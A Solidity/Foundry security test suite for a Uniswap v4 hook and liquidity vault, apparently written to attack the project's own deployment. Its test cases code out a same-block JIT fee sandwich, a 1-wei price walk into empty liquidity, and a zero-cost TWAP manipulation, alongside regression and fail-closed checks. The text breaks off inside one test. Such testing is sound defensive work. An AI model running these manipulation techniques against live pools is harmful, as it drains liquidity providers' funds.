// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {PoolManager} from "v4-core/PoolManager.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {PoolSwapTest} from "v4-core/test/PoolSwapTest.sol";
import {ModifyLiquidityParams, SwapParams} from "v4-core/types/PoolOperation.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";
import {CustomRevert} from "v4-core/libraries/CustomRevert.sol";
import {Pool} from "v4-core/libraries/Pool.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

import {MoleHook} from "../../src/MoleHook.sol";
import {MolePositions} from "../../src/MolePositions.sol";
import {HookPermissions} from "../../src/config/HookPermissions.sol";
import {deployMoleVault, deployMoleVaultOwned, hookProxyArgs, deployMoleHookAnywhere, TEST_UPGRADE_ADMIN} from "../helpers/ProxyDeploy.sol";

/// @notice CROSS-CONTRACT COMPOSITION. MolePositions and MoleHook are reviewed, tested and documented as
///         two separate contracts. This file attacks the SEAM between them: the places where each one is
///         individually correct and the PAIR is not.
///
/// The shipped deployment (script/Deploy.s.sol) is reproduced faithfully, because the seam only exists in
/// the deployed pair:
///   * MoleHook mined to 0x38C4, restrictedLiquidity = true (MOLE_RESTRICTED_LIQUIDITY; the env default is
///     false, but restricted is the mode this file exists to attack — it is what makes the vault the only
///     LP, which is the premise under C9/C11 and under the fee argument in C14),
///   * MolePositions pinned to that hook,
///   * step 3 of the script: `hook.setLiquidityAllowed(address(positions), true)` — MANDATORY, not
///     optional, because without it every open() reverts and the deployment is inert,
///   * pool created by poolCreator with the dynamic-fee flag, then whitelisted permissionlessly.
///
/// TIME. `vm.warp(block.timestamp + d)` / `vm.roll(block.number + n)` do not accumulate inside a call
/// frame. Every advance below goes through explicit `_clock` / `_height` counters.
contract AttackFinalComposition is Test, Deployers {
    using PoolIdLibrary for PoolKey;

    /* --------------------------------------------------------- shipped defaults */

    /// @dev MOLE_LP_FEE_PIPS in script/Deploy.s.sol. ONE number now, and immutable: the volatility-scaled
    ///      fee (minFee/baseFee/maxFee/volSensitivity/volWindow/feeRisesWithVolatility) was removed from the
    ///      hook rather than repaired, because the party that collects the surcharge is the party that can
    ///      manufacture the signal it is derived from — and under `restrictedLiquidity` that party is the
    ///      vault, which is a COMPOSITION fact, so its disappearance is asserted here in C0 and C14.
    uint24 internal constant D_LP_FEE = 3000;
    uint32 internal constant D_OBS_INTERVAL = 60;
    bool internal constant D_RESTRICTED = true;
    uint24 internal constant D_HOOK_FEE = 0;

    uint32 internal constant D_MIN_REBAL = 1 days;
    int24 internal constant D_MIN_W = 120;
    int24 internal constant D_MAX_W = 60_000;
    int24 internal constant D_MAX_TWAP_DEV = 600;
    uint32 internal constant D_TWAP_WINDOW = 1800;
    uint64 internal constant D_DWELL = 300;
    uint16 internal constant D_BUDGET = 10;
    uint16 internal constant D_EJECT = 10_000;

    int24 internal constant SPACING = 60;

    /* ------------------------------------------------------------------- actors */

    /// @dev The script's default: MOLE_KEEPER defaults to the deployer, who is also the hook's poolCreator.
    address internal DEPLOYER;
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal jit = makeAddr("jit");

    MoleHook internal hook;
    MolePositions internal positions;
    PoolKey internal pk;
    PoolId internal pid;

    uint256 internal _clock;
    uint256 internal _height;

    uint256 internal constant T0 = 1_800_000_000;
    uint256 internal constant H0 = 20_000_000;

    function _advance(uint256 secs) internal {
        _clock += secs;
        _height += 1 + secs / 12; // block.number is the ETHEREUM height on this chain (~12s)
        vm.warp(_clock);
        vm.roll(_height);
    }

    /* ------------------------------------------------------------------ harness */

    function _hookAddr(uint256 seed) internal pure returns (address) {
        uint160 high = uint160(uint256(keccak256(abi.encode("composition", seed)))) & ~HookPermissions.ALL_HOOK_MASK;
        return address(high | HookPermissions.REQUIRED_FLAGS);
    }

    function _deployHookFor(IPoolManager pm, uint256 seed, address creator, bool restricted, uint24 hookFee)
        internal
        returns (MoleHook h)
    {
        address a = _hookAddr(seed);
        deployCodeTo(
            "ERC1967Proxy.sol:ERC1967Proxy",
            hookProxyArgs(pm, creator, D_LP_FEE, D_OBS_INTERVAL, restricted, hookFee, creator, address(this)),
            a
        );
        h = MoleHook(a);
        require(HookPermissions.isValid(a), "harness: hook bitmap is not 0x38C4");
    }

    /// @dev Same shipped wiring, but at a chosen immutable LP fee. Exists only for C14's negative control:
    ///      an equality assertion is worth nothing until something is shown to break it.
    function _deployHookAtFee(uint256 seed, uint24 lpFee) internal returns (MoleHook h) {
        address a = _hookAddr(seed);
        deployCodeTo(
            "ERC1967Proxy.sol:ERC1967Proxy",
            hookProxyArgs(manager, DEPLOYER, lpFee, D_OBS_INTERVAL, D_RESTRICTED, D_HOOK_FEE, DEPLOYER, address(this)),
            a
        );
        h = MoleHook(a);
        require(HookPermissions.isValid(a), "harness: hook bitmap is not 0x38C4");
    }

    /// @dev Mirrors MOLE_MAX_RECENTER_TICKS in script/Deploy.s.sol. This is the price-INDEPENDENT bound
    ///      added in response to C9: however far an attacker walks spot or the TWAP, one rebalance may
    ///      only move a position this far from where it already is.
    int24 internal constant D_MAX_RECENTER = 600;

    function setUp() public {
        DEPLOYER = address(this);
        vm.warp(T0);
        vm.roll(H0);
        _clock = T0;
        _height = H0;

        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();

        // --- the shipped deployment, step by step.
        hook = _deployHookFor(manager, 1, DEPLOYER, D_RESTRICTED, D_HOOK_FEE);
        positions = deployMoleVault(
            manager, DEPLOYER, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(hook),
            D_MAX_TWAP_DEV, D_TWAP_WINDOW, D_DWELL, D_BUDGET, D_EJECT, D_MAX_RECENTER
        , 0, address(0));
        // Deploy.s.sol step 3. Not optional: without it every open() reverts.
        hook.setLiquidityAllowed(address(positions), true);

        pk = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: SPACING,
            hooks: IHooks(address(hook))
        });
        pid = pk.toId();
        manager.initialize(pk, SQRT_PRICE_1_1); // sender == poolCreator
        positions.whitelistPool(pk); // permissionless

        _fund(alice);
        _fund(bob);
        _fund(jit);
        _fund(address(this));
        _approve(alice, address(positions));
        _approve(bob, address(positions));
        _approve(jit, address(positions));
        _approve(jit, address(modifyLiquidityRouter));
        _approve(jit, address(swapRouter));
        _approve(bob, address(swapRouter)); // bob is the third-party flow in C14
    }

    function _fund(address who) internal {
        MockERC20(Currency.unwrap(currency0)).mint(who, 10_000_000e18);
        MockERC20(Currency.unwrap(currency1)).mint(who, 10_000_000e18);
    }

    function _approve(address who, address spender) internal {
        vm.startPrank(who);
        MockERC20(Currency.unwrap(currency0)).approve(spender, type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(spender, type(uint256).max);
        vm.stopPrank();
    }

    function _open(MolePositions m, PoolKey memory k, address who, int24 lo, int24 hi, uint128 liq)
        internal
        returns (uint256 id)
    {
        vm.prank(who);
        id = m.open(k, lo, hi, liq, type(uint256).max, type(uint256).max, block.timestamp);
    }

    function _swap(bool zeroForOne, uint256 amount) internal {
        swapRouter.swap(
            pk,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amount),
                sqrtPriceLimitX96: zeroForOne ? MIN_PRICE_LIMIT : MAX_PRICE_LIMIT
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
    }

    /// @dev The exact bytes the PoolManager reverts with when OUR hook refuses an add. v4 wraps a hook
    ///      revert in CustomRevert.WrappedError, so a bare `vm.expectRevert()` here would also pass on an
    ///      out-of-gas, a wrong-hook-address, or the vault refusing for its own unrelated reasons — which
    ///      is precisely the "green for the wrong reason" this suite exists to prevent.
    function _hookRefusedTheAdd(address h) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            h,
            IHooks.beforeAddLiquidity.selector,
            abi.encodeWithSelector(MoleHook.LiquidityNotAllowed.selector),
            abi.encodeWithSelector(Hooks.HookCallFailed.selector)
        );
    }

    function _bal(address who) internal view returns (uint256) {
        return MockERC20(Currency.unwrap(currency0)).balanceOf(who)
            + MockERC20(Currency.unwrap(currency1)).balanceOf(who);
    }

    function _restoreToParity() internal {
        (uint160 sp,,,) = StateLibrary.getSlot0(manager, pid);
        if (sp == SQRT_PRICE_1_1) return;
        bool zeroForOne = sp > SQRT_PRICE_1_1;
        swapRouter.swap(
            pk,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -int256(2_000_000e18), sqrtPriceLimitX96: SQRT_PRICE_1_1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
    }

    /* =================================================================== C0 =======
       CONTROL. The seam exists at all: the pair is wired the way the script wires it.
       ============================================================================== */

    function test_C0_theShippedPairIsWiredAsTheScriptWiresIt() public view {
        assertTrue(hook.restrictedLiquidity(), "hook is not in restricted mode");
        assertTrue(hook.liquidityAllowed(address(positions)), "script step 3 did not allowlist the vault");
        assertEq(positions.moleHook(), address(hook), "vault is not pinned to the hook");
        assertEq(positions.keeper(), hook.poolCreator(), "shipped default: one key holds both roles");
        assertTrue(positions.isWhitelisted(pid), "pool not admitted by the vault");

        // The fee the pair ships with is ONE immutable number, quoted from three places that must agree:
        // the immutable itself, the view the periphery reads, and the value afterInitialize actually wrote
        // into the PoolManager. A disagreement between them is exactly how the old dynamic fee hid — the
        // stored fee and the quoted fee were allowed to differ, and only the quoted one was ever asserted.
        assertEq(hook.lpFeePips(), D_LP_FEE, "hook was not deployed at the shipped LP fee");
        assertEq(hook.currentFee(pid), D_LP_FEE, "the view does not report the shipped LP fee");
        (,,, uint24 storedLpFee) = StateLibrary.getSlot0(manager, pid);
        assertEq(storedLpFee, D_LP_FEE, "afterInitialize did not write the shipped fee into the pool");
    }

    /* =================================================================== C1 =======
       THE ALLOWLISTED CALLER IS A PERMISSIONLESS ROUTER.

       MoleHook gates the add-liquidity path on `liquidityAllowed[sender]`, where `sender` is whoever
       called PoolManager.modifyLiquidity. Deploy.s.sol step 3 puts MolePositions on that list — it has
       to, or the deployment is inert. MolePositions.open() is permissionless and has no age, dwell or
       exit gate of its own (minDwellL1Blocks binds the KEEPER's rebalance, not the owner's withdrawal).

       So the hook admits the vault, and the vault admits everyone.
       ============================================================================== */

    function test_C1_unlistedAddressIsRefusedDirectlyAndAdmittedThroughTheVault() public {
        assertFalse(hook.liquidityAllowed(jit), "precondition: jit must not be on the hook's allowlist");

        // Direct route: refused, as the hook intends — and refused by the ALLOWLIST specifically.
        vm.prank(jit);
        vm.expectRevert(_hookRefusedTheAdd(address(hook)));
        modifyLiquidityRouter.modifyLiquidity(
            pk,
            ModifyLiquidityParams({tickLower: -600, tickUpper: 600, liquidityDelta: 1e18, salt: bytes32(0)}),
            ZERO_BYTES
        );

        // Same address, same pool, same block: admitted through the contract the hook allowlisted.
        uint256 id = _open(positions, pk, jit, -600, 600, 1e18);
        assertEq(positions.ownerOf(id), jit, "the vault did not record the unlisted address as owner");
        assertEq(StateLibrary.getLiquidity(manager, pid), 1e18, "liquidity was not actually added");

        // ...and back out again in the SAME block. No dwell, no age, no cadence on the exit side.
        vm.prank(jit);
        positions.withdrawAll(id);
        assertEq(StateLibrary.getLiquidity(manager, pid), 0, "same-block exit was refused");
    }

    /* =================================================================== C2 =======
       AND IT PAYS. A single-block JIT sandwich, executed by an address that is NOT on the hook's
       allowlist, with no keeper key, no poolCreator key, and no operator mistake — routed entirely
       through the contract the deploy script is REQUIRED to allowlist.

       Both runs finish at exactly SQRT_PRICE_1_1 (the restore swap is limit-bounded), so the two
       token0+token1 sums are measured at the same price and the delta is fee income, not composition.
       ============================================================================== */

    function test_C2_jitSandwichThroughTheVaultTakesTheHonestLpsFees() public {
        uint256 aliceStart = _bal(alice);
        uint256 jitStart = _bal(jit);
        uint256 aliceId = _open(positions, pk, alice, -30_000, 30_000, 20_000e18);

        uint256 snap = vm.snapshotState();

        /* ---- CONTROL: no JIT. The honest LP is the only liquidity for the whole block. */
        _swap(true, 400e18);
        _restoreToParity();
        vm.prank(alice);
        positions.withdrawAll(aliceId);
        int256 controlYield = int256(_bal(alice)) - int256(aliceStart);

        vm.revertToState(snap);

        /* ---- ATTACK: identical volume, but an unlisted address stands in front of it for zero blocks. */
        uint256 jitId = _open(positions, pk, jit, -600, 600, 2_000_000e18);
        _swap(true, 400e18);
        _restoreToParity();
        vm.prank(jit);
        positions.withdrawAll(jitId); // same block as the open. Nothing gates this.
        int256 jitPnl = int256(_bal(jit)) - int256(jitStart);

        vm.prank(alice);
        positions.withdrawAll(aliceId);
        int256 attackedYield = int256(_bal(alice)) - int256(aliceStart);

        console2.log("C2 honest LP yield, no JIT   :", controlYield);
        console2.log("C2 honest LP yield, with JIT :", attackedYield);
        console2.log("C2 JIT pnl (unlisted address):", jitPnl);

        assertGt(jitPnl, 0, "the JIT round trip was not profitable");
        assertLt(attackedYield, controlYield, "the JIT did not take fee income from the honest LP");
    }

    /* =================================================================== C3 =======
       BLAST RADIUS. `whitelistPool` is permissionless, so the bypass is not confined to the pool the
       operator meant the vault to serve: ANY pool bound to this hook can be pulled into the vault by a
       stranger, and from that moment the hook's LP allowlist is void on it too.
       ============================================================================== */

    function test_C3_anyPoolBoundToTheHookCanBePulledIntoTheVaultByAStranger() public {
        // A second pool the operator creates for some other purpose. It is NEVER whitelisted by the team.
        PoolKey memory other = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: 10,
            hooks: IHooks(address(hook))
        });
        manager.initialize(other, SQRT_PRICE_1_1); // poolCreator only
        PoolId otherId = other.toId();

        // The unlisted JIT bot cannot provide to it directly.
        vm.prank(jit);
        vm.expectRevert(_hookRefusedTheAdd(address(hook)));
        modifyLiquidityRouter.modifyLiquidity(
            other,
            ModifyLiquidityParams({tickLower: -600, tickUpper: 600, liquidityDelta: 1e18, salt: bytes32(0)}),
            ZERO_BYTES
        );

        // ...so it whitelists the pool itself — permissionless — and walks in through the vault.
        vm.prank(jit);
        positions.whitelistPool(other);
        assertTrue(positions.isWhitelisted(otherId), "stranger could not whitelist the operator's other pool");

        vm.prank(jit);
        uint256 id = positions.open(other, -600, 600, 1e18, type(uint256).max, type(uint256).max, block.timestamp);
        assertEq(StateLibrary.getLiquidity(manager, otherId), 1e18, "unlisted LP did not get into the second pool");

        vm.prank(jit);
        positions.withdrawAll(id);
    }

    /* =================================================================== C4 =======
       CONTROL / seam claim: the hook operator's one admin call is a DEPOSIT-side and KEEPER-side kill
       switch on the vault, reaching across the contract boundary. It must not reach the exit.
       ============================================================================== */

    function test_C4_revokingTheVaultsAllowlistKillsDepositsAndRebalancesButNeverExits() public {
        uint256 aliceId = _open(positions, pk, alice, -30_000, 30_000, 20_000e18);

        // Warm the oracle past the 1800s TWAP window so the rebalance failure below cannot be blamed on it.
        for (uint256 i = 0; i < 40; i++) {
            _advance(61);
            _swap(i % 2 == 0, 10e18);
        }
        hook.consult(pid, D_TWAP_WINDOW); // must not revert
        _advance(1 days);

        // The hook operator (== the keeper key under the shipped defaults) revokes the vault.
        hook.setLiquidityAllowed(address(positions), false);

        // Deposits: dead — and dead at the hook's allowlist, not at some incidental failure in the vault.
        vm.prank(bob);
        vm.expectRevert(_hookRefusedTheAdd(address(hook)));
        positions.open(pk, -600, 600, 1e18, type(uint256).max, type(uint256).max, block.timestamp);

        // Rebalance: dead, because the re-mint half of it goes through beforeAddLiquidity. Same error,
        // which is the evidence that it is the RE-MINT that fails and not the burn — a burn cannot reach
        // this hook at all, the remove-liquidity bits being unmined.
        vm.prank(DEPLOYER);
        vm.expectRevert(_hookRefusedTheAdd(address(hook)));
        positions.rebalance(aliceId, -30_060, 29_940);

        // Exit: alive. This is the load-bearing claim and it survives the seam.
        uint256 before = _bal(alice);
        vm.prank(alice);
        positions.withdrawAll(aliceId);
        assertGt(_bal(alice), before, "the exit paid nothing while the hook was hostile");
        assertEq(positions.getPosition(aliceId).liquidity, 0, "the exit did not complete");
    }

    /* =================================================================== C5 =======
       A MolePositions pinned to a hook that was mined and deployed for a DIFFERENT PoolManager.
       The constructor only proves BITS, never identity — so does the mis-pin fail closed?
       ============================================================================== */

    function test_C5_vaultPinnedToAHookBuiltForAnotherPoolManagerFailsClosed() public {
        PoolManager otherManager = new PoolManager(address(this));

        // Hook belongs to `otherManager`; the vault will be deployed against `manager`.
        MoleHook foreign = _deployHookFor(IPoolManager(address(otherManager)), 77, DEPLOYER, false, 0);

        MolePositions crossed = deployMoleVault(
            manager, DEPLOYER, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(foreign),
            D_MAX_TWAP_DEV, D_TWAP_WINDOW, D_DWELL, D_BUDGET, D_EJECT, D_MAX_RECENTER
        , 0, address(0));
        assertEq(crossed.moleHook(), address(foreign), "the mis-pin was refused at deploy (it is not)");

        PoolKey memory k = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: SPACING,
            hooks: IHooks(address(foreign))
        });

        // The vault happily admits the key: identity pinning does not know which manager the hook serves.
        crossed.whitelistPool(k);
        assertTrue(crossed.isWhitelisted(k.toId()), "whitelist refused the mis-pinned key");

        // But the pool can never exist on the vault's manager: beforeInitialize is onlyPoolManager and the
        // hook's manager is the other one. So nothing can ever be deposited into it. Fail-closed — and
        // named exactly, because "it reverted" would also be satisfied by a pool that failed to create for
        // some benign reason and could be created on a second attempt.
        vm.expectRevert(
            abi.encodeWithSelector(
                CustomRevert.WrappedError.selector,
                address(foreign),
                IHooks.beforeInitialize.selector,
                abi.encodeWithSelector(MoleHook.NotPoolManager.selector),
                abi.encodeWithSelector(Hooks.HookCallFailed.selector)
            )
        );
        manager.initialize(k, SQRT_PRICE_1_1);

        // ...and with no pool there, the deposit dies on the PoolManager's own initialization check,
        // before the vault can do anything with the caller's tokens.
        vm.expectRevert(Pool.PoolNotInitialized.selector);
        crossed.open(k, -600, 600, 1e18, type(uint256).max, type(uint256).max, block.timestamp);
    }

    /* =================================================================== C6 =======
       TWO VAULTS, ONE HOOK, ONE POOL. Positions must stay independent, and a vault that the operator
       has since de-allowlisted must still let its own users out.
       ============================================================================== */

    function test_C6_twoVaultsOnOneHookStayIndependentAndTheRetiredOneStillExits() public {
        MolePositions v2 = deployMoleVault(
            manager, DEPLOYER, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(hook),
            D_MAX_TWAP_DEV, D_TWAP_WINDOW, D_DWELL, D_BUDGET, D_EJECT, D_MAX_RECENTER
        , 0, address(0));
        hook.setLiquidityAllowed(address(v2), true);
        v2.whitelistPool(pk);
        _approve(bob, address(v2));
        _approve(alice, address(v2));

        // Same pool, same ranges, and deliberately the same position id (1) in both vaults, so any salt
        // collision inside the PoolManager would surface here.
        uint256 idA = _open(positions, pk, alice, -600, 600, 5e18);
        uint256 idB = _open(v2, pk, bob, -600, 600, 7e18);
        assertEq(idA, idB, "harness: the two ids were meant to collide");
        assertEq(StateLibrary.getLiquidity(manager, pid), 12e18, "both positions are not in the pool");

        // Retire vault 1 at the hook. Its users must still get out.
        hook.setLiquidityAllowed(address(positions), false);

        vm.prank(alice);
        positions.withdrawAll(idA);
        assertEq(StateLibrary.getLiquidity(manager, pid), 7e18, "vault 1's exit took vault 2's liquidity");

        vm.prank(bob);
        v2.withdrawAll(idB);
        assertEq(StateLibrary.getLiquidity(manager, pid), 0, "vault 2 could not exit");
    }

    /* =================================================================== C7 =======
       A pool whitelisted on the vault before the hook's oracle can answer the vault's window.
       ============================================================================== */

    function test_C7_coldOracleFailsClosedForTheKeeperAndOpenForTheOwner() public {
        uint256 id = _open(positions, pk, alice, -30_000, 30_000, 20_000e18);

        // Cadence and dwell satisfied; only the oracle is cold.
        _advance(2 days);
        assertGe(block.timestamp, T0 + D_MIN_REBAL, "cadence not satisfied");

        // The oracle CAN answer here (afterInitialize seeded it and no swap has moved the tick), so the
        // keeper is not blocked by a cold ring on a fresh pool — record what actually happens.
        vm.prank(DEPLOYER);
        positions.rebalance(id, -30_060, 29_940);

        // Owner exit is untouched either way.
        vm.prank(alice);
        positions.withdrawAll(id);
        assertEq(positions.getPosition(id).liquidity, 0, "exit blocked");
    }

    /* =================================================================== C8 =======
       PROBE. What does a swap do when the pool carries no IN-RANGE liquidity? On a restricted pool the
       vault's positions are the only liquidity there is, so this is not an exotic state.
       ============================================================================== */

    function test_C8_onceTheMarketLeavesTheRangeOneWeiWalksThePriceAnywhere() public {
        uint256 id = _open(positions, pk, alice, -600, 600, 20_000e18);

        // The market leaves her band. Ordinary trading, stopped at a perfectly ordinary price.
        _advance(61);
        _swapTo(true, 5_000e18, TickMath.getSqrtPriceAtTick(-1200));
        (, int24 tAfterTrade,,) = StateLibrary.getSlot0(manager, pid);
        assertEq(tAfterTrade, -1200, "harness: the trade did not stop where it was told");
        assertEq(StateLibrary.getLiquidity(manager, pid), 0, "harness: in-range depth is not zero");

        // From here it costs ONE WEI of intent to move spot to the bottom of the tick space, because
        // there is no depth between here and there for the price to have to buy through.
        uint256 b0 = MockERC20(Currency.unwrap(currency0)).balanceOf(jit);
        uint256 b1 = MockERC20(Currency.unwrap(currency1)).balanceOf(jit);
        _advance(61);
        vm.prank(jit);
        swapRouter.swap(
            pk,
            SwapParams({zeroForOne: true, amountSpecified: -1, sqrtPriceLimitX96: MIN_PRICE_LIMIT}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        (, int24 tAfterDust,,) = StateLibrary.getSlot0(manager, pid);
        console2.log("C8 tick after an ordinary trade :", int256(tAfterTrade));
        console2.log("C8 tick after a 1-wei swap      :", int256(tAfterDust));
        console2.log("C8 currency0 the attacker spent :", b0 - MockERC20(Currency.unwrap(currency0)).balanceOf(jit));
        console2.log("C8 currency1 the attacker got   :", MockERC20(Currency.unwrap(currency1)).balanceOf(jit) - b1);
        console2.log("C8 hook lastTick now            :", int256(_hookLastTick()));

        assertEq(tAfterDust, TickMath.MIN_TICK, "the 1-wei swap did not walk spot to the floor");
        assertLe(b0 - MockERC20(Currency.unwrap(currency0)).balanceOf(jit), 1, "the walk cost more than a wei");
        assertEq(_hookLastTick(), TickMath.MIN_TICK, "the hook's oracle did not record the walked tick");

        vm.prank(alice);
        positions.withdrawAll(id);
    }

    function _swapTo(bool zeroForOne, uint256 amount, uint160 limit) internal {
        swapRouter.swap(
            pk,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -int256(amount), sqrtPriceLimitX96: limit}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
    }

    /// @dev PoolState is now (index, lastTimestamp, lastObsTimestamp, lastTick, tickCumulative,
    ///      initialized) — `volAccum` and `lastObsTick` went with the volatility fee, so this reads six
    ///      fields where it used to read eight. `lastTick` is still the 4th and is still what the oracle
    ///      records, which is the only thing this helper ever cared about.
    function _hookLastTick() internal view returns (int24 t) {
        (, , , t, ,) = hook.poolStates(pid);
    }

    /* =================================================================== C9 =======
       THE SEAM BREAK.

       MolePositions anchors `maxTwapDeviationTicks` on MoleHook's TWAP rather than on slot0, and says
       why: "spot is exactly what an ordering-privileged party can move for free". The unstated premise
       is that the TIME-AVERAGE is not free to move — that HOLDING a manipulated price for `twapWindow`
       costs an attacker arbitrage losses against the pool's liquidity.

       MoleHook's own `restrictedLiquidity` removes that premise. On a restricted pool the vault's
       concentrated positions are the ONLY liquidity there is, so as soon as spot leaves every range the
       pool has zero in-range depth — and a swap into zero depth walks to the tick-space limit and STAYS
       there, because there is nothing left to arbitrage against. The time-average then converges on the
       limit at zero cost, and the keeper's band goes with it.

       Neither contract is wrong on its own. The pair is.
       ============================================================================== */

    function test_regression_C9_walkedTwapNoLongerUnbindsTheKeeper() public {
        uint256 id = _open(positions, pk, alice, -600, 600, 20_000e18);

        // A genuine market: real two-way volume, real observations, a real TWAP near parity.
        for (uint256 i = 0; i < 40; i++) {
            _advance(61);
            _swap(i % 2 == 0, 20e18);
        }
        int24 honestTwap = hook.consult(pid, D_TWAP_WINDOW);
        console2.log("C9 honest TWAP before the walk :", int256(honestTwap));
        assertLt(honestTwap > 0 ? honestTwap : -honestTwap, 600, "harness: TWAP should sit near parity");

        _advance(2 days); // clear the cadence and the dwell

        // Where the attacker intends to park the market, and the range it wants the victim re-minted at.
        // Not the tick-space floor: at MIN_TICK `getLiquidityForAmounts` truncates to zero and the mint
        // fails closed on precision alone. -200_100 is far enough — 1.0001^-200000 is about 2.1e-9 — and
        // the arithmetic there is perfectly healthy.
        int24 parkTick = -200_100;
        int24 lo = -199_980;
        int24 hi = -199_860; // midpoint -199_920, i.e. 180 ticks from the parked TWAP

        // Both bounds refuse this range right now. The relative one is checked first — deliberately,
        // because it is the one that does not depend on an oracle being honest — so that is the error
        // seen here. Before maxRecenterTicks existed this read RangeTooFarFromTwap, and the whole attack
        // below consisted of making that particular error go away.
        vm.prank(DEPLOYER);
        vm.expectRevert(MolePositions.RecenterTooFar.selector);
        positions.rebalance(id, lo, hi);

        /* ---- STEP 1. An UNPRIVILEGED address sweeps the only liquidity there is. This is a trade: it
                pays for what it receives. Once the depth is gone the same swap keeps walking, into
                nothing, until it reaches whatever price limit the attacker named. */
        uint256 sweep0 = MockERC20(Currency.unwrap(currency0)).balanceOf(jit);
        uint256 sweep1 = MockERC20(Currency.unwrap(currency1)).balanceOf(jit);
        _advance(61);
        vm.prank(jit);
        swapRouter.swap(
            pk,
            SwapParams({
                zeroForOne: true,
                amountSpecified: -5_000e18,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(parkTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        (, int24 parked,,) = StateLibrary.getSlot0(manager, pid);
        console2.log("C9 spot after the sweep        :", int256(parked));
        assertEq(parked, parkTick, "the sweep did not park spot where the attacker asked");
        assertEq(StateLibrary.getLiquidity(manager, pid), 0, "there is still in-range depth to arbitrage");

        /* ---- STEP 2. Hold it. This costs NOTHING and requires no further transaction: with no
                liquidity in range there is no arbitrage that can move it back, and the hook's
                cumulative keeps accruing at `lastTick` whether anyone swaps or not. */
        _advance(D_TWAP_WINDOW + 60);
        int24 walkedTwap = hook.consult(pid, D_TWAP_WINDOW);
        console2.log("C9 TWAP after a free 30m hold  :", int256(walkedTwap));
        assertEq(walkedTwap, parkTick, "the time-average did not follow spot to the parked price");

        /* ---- STEP 3. THE FIX. Everything above still works — a thin pool's time-average IS
                manipulable, exactly as learnings.txt Part 6 warns ("TWAP is not safe at any window
                length" on a long-tail pool), and no amount of window length changes that. What changed
                is that the keeper can no longer ACT on it.

                `maxRecenterTicks` is a RELATIVE bound: one rebalance may move a position's midpoint only
                so far from where it already is. It reads no price, so walking the anchor buys nothing.
                The rebalance that this attack exists to enable is now refused — and refused by the
                price-independent guard, not by the oracle-anchored one, which is the whole point. */
        vm.prank(DEPLOYER);
        vm.expectRevert(MolePositions.RecenterTooFar.selector);
        positions.rebalance(id, lo, hi);

        // The position is untouched: same range, same liquidity.
        assertEq(positions.getPosition(id).tickLower, -600, "the position moved despite the refusal");
        assertEq(positions.getPosition(id).tickUpper, 600, "the position moved despite the refusal");

        // And the owner still holds her principal. This is the assertion that matters: the attack's
        // measured outcome was 100% of a leg leaving the owner, and it no longer happens.
        (uint256 a0, uint256 a1) = _grossExit(alice, id);
        console2.log("C9 owner recovers cur0 (post-fix):", a0);
        console2.log("C9 owner recovers cur1 (post-fix):", a1);
        assertGt(a0 + a1, 0, "the owner recovered nothing at all");

        // The walk itself was free and is NOT claimed to be fixed — pinned here so nobody mistakes this
        // regression for a claim that the oracle became manipulation-proof. It did not.
        assertEq(walkedTwap, parkTick, "the free TWAP walk is no longer reproducible - re-verify the fix");
        sweep0;
        sweep1;
    }

    /* ================================================================== C10 =======
       Is `maxEjectionBps` a mitigation? It is the one bound that looks at what a rebalance HANDS BACK,
       and the shipped default leaves it at 10_000 (off). Rerun C9 against a vault that has it switched
       hard on and see whether the wick rebalance is refused.
       ============================================================================== */

    function test_C10_ejectionCapDoesNotReliablyStopTheWickRebalance() public {
        // Same vault policy, except the ejection cap is set as tight as anyone plausibly would.
        MolePositions tight = deployMoleVault(
            manager, DEPLOYER, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(hook),
            D_MAX_TWAP_DEV, D_TWAP_WINDOW, D_DWELL, D_BUDGET, 500 // 5%
        , 0, 0, address(0));
        hook.setLiquidityAllowed(address(tight), true);
        tight.whitelistPool(pk);
        _approve(alice, address(tight));

        uint256 id = _open(tight, pk, alice, -600, 600, 20_000e18);

        // NO fee accrual on the currency1 leg: go straight to the walk, so `have1` is zero at the burn.
        // That is the case the cap cannot see, because its test is `residual * 10_000 > have * cap` and
        // 0 > 0 is false.
        _advance(2 days);

        int24 parkTick = -200_100;
        int24 lo = -199_980;
        int24 hi = -199_860;

        _advance(61);
        vm.prank(jit);
        swapRouter.swap(
            pk,
            SwapParams({
